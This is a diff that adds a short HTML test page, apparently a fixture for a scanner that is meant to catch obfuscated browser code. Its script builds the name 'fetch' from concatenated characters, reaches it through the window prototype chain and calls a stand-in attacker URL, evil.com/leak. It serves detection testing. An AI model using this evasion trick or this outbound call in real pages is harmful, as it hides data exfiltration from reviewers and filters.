@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Obfuscated Prototype Chain Attack</title>
+</head>
+<body>
+  <!-- Attack: Access fetch via prototype chain -->
+  <script>
+    // This should be caught by AST analysis - computed access on window chain
+    const proto = Object.getPrototypeOf(window);
+    const fetch = proto['f' + 'e' + 't' + 'c' + 'h'];
+    fetch.call(window, 'https://evil.com/leak').then(console.log);
+  </script>
+</body>
+</html>
